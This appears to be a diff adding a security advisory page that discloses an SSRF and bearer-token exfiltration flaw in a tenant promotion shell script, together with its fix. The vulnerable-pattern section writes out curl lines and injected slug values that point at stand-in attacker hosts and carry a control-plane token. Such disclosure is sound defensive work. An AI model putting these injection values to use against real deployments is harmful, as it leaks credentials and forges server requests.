@@ -1,0 +1,82 @@
+---
+title: "OFFSEC-006: Tenant Slug SSRF + Token Exfiltration (2026-05-14)"
+description: High-severity SSRF and bearer-token exfiltration via unsanitised tenant slug interpolation in self-hosted deployment scripts.
+---
+
+## Advisory overview
+
+**Severity:** HIGH
+**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html) (SSRF) + [CWE-20](https://cwe.mitre.edu/data/definitions/20.html) (Improper Input Validation)
+**Affected file:** `scripts/promote-tenant-image.sh`
+**Affected versions:** All self-hosted deployments prior to the fix in `molecule-core` PR [#933](https://git.moleculesai.app/molecule-ai/molecule-core/pull/933)
+**Fixed in:** `molecule-core` #933 (2026-05-14)
+**SaaS impact:** None — the platform applies the fix server-side
+
+This advisory documents a high-severity Server-Side Request Forgery (SSRF) and bearer-token exfiltration vulnerability in the tenant promotion script used by self-hosted operators.
+
+---
+
+## Vulnerability details
+
+Tenant slugs were interpolated directly into URL paths and ECR repository identifiers without any sanitisation.
+
+### Affected code pattern
+
+```bash
+# Vulnerable — slug inserted into URL path unchecked
+SLUG="?url=https://attacker.com"
+curl "${PLATFORM_URL}/cp_redeploy_tenant/${SLUG}"  # SSRF
+curl "?url=https://evil.com&token=${CP_TOKEN}"      # Token exfiltration
+```
+
+A malicious tenant slug such as `?url=https://attacker.com&token=$CP_TOKEN` passed to `promote-tenant-image.sh` could cause the platform to:
+
+1. **SSRF** — redirect HTTP calls to an attacker-controlled host by injecting a URL parameter
+2. **Bearer-token exfiltration** — the platform's `CP_TOKEN` appears in the attacker's server access logs via the same URL parameter injection
+
+### Secondary attack: glob expansion
+
+Bash glob metacharacters (`*`, `?`, `[`) in slug values were subject to pathname expansion, allowing a slug like `evil?url=https://attacker.com` to expand to a list of filenames before being passed to curl.
+
+---
+
+## Recommended mitigations
+
+### Upgrade (self-hosted operators)
+
+If you are running a self-hosted control plane, upgrade to the latest `molecule-core` build that includes `molecule-core` PR [#933](https://git.moleculesai.app/molecule-ai/molecule-core/pull/933).
+
+After upgrading, tenant slugs are validated against RFC-1123 before any network call:
+
+```bash
+# Invalid slugs are rejected with exit code 64
+$ ./promote-tenant-image.sh "?url=https://evil.com"
+Error: invalid tenant slug "?url=https://evil.com" — must match ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$
+```
+
+### If you cannot upgrade immediately
+
+Audit your tenant slugs manually. Any slug containing the characters `?`, `#`, `&`, `$`, `/`, `\`, or spaces is a potential exploit vector. Rename affected tenants with clean slugs matching `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$`.
+
+---
+
+## Fix summary
+
+Two-layer defence applied in `scripts/promote-tenant-image.sh`:
+
+1. **`set -f`** (line 57): disables glob expansion before any slug is used, so `*`, `?`, and `[` are treated as literal characters.
+2. **`validate_slug()`**: new function using RFC-1123 regex validation (`^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$`). Rejects non-conforming slugs with exit code 64 before any network call is issued.
+
+---
+
+## Credit
+
+Found and fixed by the Molecule AI security team during internal code review.
+
+---
+
+## Related advisories
+
+- [SAFE-MCP Security Advisory](./safe-mcp-advisory.mdx) — April 2026 audit findings (G-01 through G-03)
+- [Security Changelog](./changelog.md) — full history of security fixes
+- [OWASP Agentic Top 10](./owasp-agentic-top-10.mdx) — risk framework reference
